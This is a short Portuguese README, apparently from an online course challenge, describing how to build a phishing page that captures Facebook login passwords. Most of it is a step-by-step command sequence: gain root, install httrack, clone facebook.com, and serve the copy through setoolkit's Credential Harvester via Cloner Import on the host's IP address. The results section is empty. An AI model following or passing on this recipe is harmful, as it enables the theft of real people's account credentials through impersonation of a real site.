# digital-inovation-one_Facebook-Phishing
"Neste desafio de projeto, iremos criar um Phishing para capturar senhas de login do Facebook."

# Phishing para captura de senhas do Facebook

O método apresentado no modulo "Criação de um Phishing com o Kali Linux" não retornou nenhuma senha ou usuário portanto foi necessesário utilizar uma maneira alternativa com httrack

### Ferramentas

- Kali Linux
- setoolkit
- httrack
  
### Método alternativo

- Acesso root: ``` sudo su ```
- Baixando httrack: ```apt install httrack```
- Clonando a página: ```httrack https://www.facebook.com -O /home/kali/facebook ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Cloner Import ```
- ```Enter```
- Passando o caminho: ``` /home/kali/facebook/m.facebook.com/```
- Site clonado: ```m.facebook.com```
- Obtendo o endereço da máquina: ``` ifconfig ```
- Acessar utilizando ```ip.do.host:porta_host```

### Resutados

